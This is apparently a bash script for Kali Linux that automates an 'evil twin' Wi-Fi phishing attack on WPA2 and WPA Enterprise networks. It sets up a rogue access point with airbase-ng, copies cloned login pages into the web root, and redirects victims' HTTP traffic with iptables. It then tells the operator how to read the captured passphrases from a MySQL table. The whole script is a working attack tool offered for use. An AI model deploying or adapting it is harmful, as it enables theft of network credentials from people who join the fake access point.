###################################
# Program Begins See Posted Helpfiles for setup instructions
# WPA2-WPA Enterprise Phishing For Kali Linux
# Stop all process to insure a tap interface of at0 and port53 free
#
/etc/init.d/apache2 stop
/etc/init.d/mysql stop
killall -9 airbase-ng
killall -9 dnsmasq
sleep 3
clear
echo "<<<< Before proceeding you will require the following information: >>>>"
echo " "
echo "     1. Name of Target AP."
echo "     2. Channel to use - keep three(3) channels away from target"
echo "          to prevent mdk3 or airdrop-ng conflict."
echo "     3. Maccode for softAP."
echo "     4. Type of attack WPA Enterprise or WPA2"
echo "     5. Device providing an internet connection."
echo "     6. IP of internet connection. Establish this"
echo "          connection and note IP before continuing."
echo "          See network manager - connection information"
echo ""
echo "  !!!Suggest establishing an internet connection prior to continuing!!!"
echo "   Confirm you have connection to the internet not just AP association"
echo""
sleep 3
echo "If your target is WPA Enterprise type 1 if WPA2 type 2 (APTYPE)"
read APTYPE
if [ $APTYPE -eq 1 ]
then
   rm /var/www/*.*
   cp /var/www/enterprise/*.* /var/www
   echo "Erasing contents of www folder"
   echo "Moving enterprise web files to www folder"
fi
#
if [ $APTYPE -eq 2 ]
then
   rm /var/www/*.*
   cp /var/www/verizon/*.* /var/www
   echo "Erasing contents of www folder"
   echo "Moving verizon web files to www folder"
fi
sleep 5
# Clear all moniters
airmon-ng stop mon6
airmon-ng stop mon5
airmon-ng stop mon4
airmon-ng stop mon3
airmon-ng stop mon2
airmon-ng stop mon1
clear
airmon-ng stop mon0
echo ""
echo "What wifi adapter will you put in moniter mode ie wlan0, ath0 etc? (MON)"
read MON
airmon-ng start $MON
echo ""
echo "What is your moniters designation ie mon0,mon1 etc? (DEV)"
read DEV
echo ""
clear
echo ""
echo ""
echo ""
echo ""
echo ""
echo ""
echo "What would you like to name the AP?"
echo "  If name has a space like wifi hotspot,"
echo "    place quotation marks around the name. (ESSID)"
read ESSID
echo ""
echo "What channel would you like to use for the AP? (CHANNEL)"
read CHANNEL
echo ""
echo "What maccode would you like to use for the AP ie 00:11:22:33:44:55? (MACCODE)"
read MACCODE
echo ""
echo "[ + ] Starting soft AP in new Eterm window, for debugging with $DEV"
echo "[ > ]   And ESSID: $ESSID"
echo "[ > ]   And CHANNEL: $CHANNEL"
echo "[ > ]   And MACCODE: $MACCODE"
#
Eterm -g 55-4+1 -O -e sh -c "airbase-ng -e $ESSID -c $CHANNEL -a $MACCODE -C 30 -v $DEV; bash" &
sleep 2;
#
echo "[ + ] adding route for packet forwarding..."
echo ""
echo "What is the device connected to the internet ie wlan0,wlan2,eth0 etc? (INTDEV)"
read INTDEV
clear
echo ""
echo ""
echo ""
echo "Right Click on network manager in kali upper righthand corner"
echo "      Get IP from connection details in drop down menu"
echo ""
echo "What is the IP address for the device connected to the internet ie 192.168.1.101 etc? (IPINTDEV)"
read IPINTDEV
ifconfig at0 up
ifconfig at0 192.168.0.1 netmask 255.255.255.0
dnsmasq -C /etc/dnsmasq.conf
iptables --flush
iptables --table nat --flush
iptables --delete-chain
iptables --table nat --delete-chain
#
# <<?INTDEV variable changes --out-interface to designation of device attached >>
# <<<<< to internet >>>>>
iptables --table nat --append POSTROUTING --out-interface $INTDEV -j MASQUERADE 
iptables --append FORWARD --in-interface at0 -j ACCEPT
echo 1 > /proc/sys/net/ipv4/ip_forward
# << $IPINTDEV variable sets ip assigned to device when internet access obtained >>
# << Note the :80 is the port and should not be changed >>
iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination $IPINTDEV:80
iptables -t nat -A POSTROUTING -j MASQUERADE
/etc/init.d/apache2 start
/etc/init.d/mysql start
Eterm -g 11-300 -O -e sh -c "firefox http://127.0.0.1/index.html; bash" &
sleep 2;
echo "######################################################################"
echo ""
echo "You are about to enter the mysql sub routine."
echo "Run the following commands" 
echo "First enter the root password or hit enter if no password exists"
echo "You will get a mysql> prompt if password is correct"
echo "If program stops you have entered the wrong password"
echo "Close ALL web,script and Eterm pages and rerun the program"
echo "Consult help files"
echo "When you run the program the first time enter the"
echo "  four(4) commands below after the mysql> prompt"
echo "mysql>create database wpa2;"
echo "mysql>use wpa2"
echo "mysql>create table content(key1 VARCHAR(64), key2 VARCHAR(64));"
echo "mysql>select * from content;"
echo "========================"
echo "If data base already made enter"
echo "mysql>use wpa2;"
echo "To see any passwords phished type"
echo "mysql>select * from content;"
echo ""
echo "!!!!!READ ABOVE BETWEEN THE ############### BEFORE CONTINUING!!!!!"
echo "#######################################################################"
mysql -u root -p
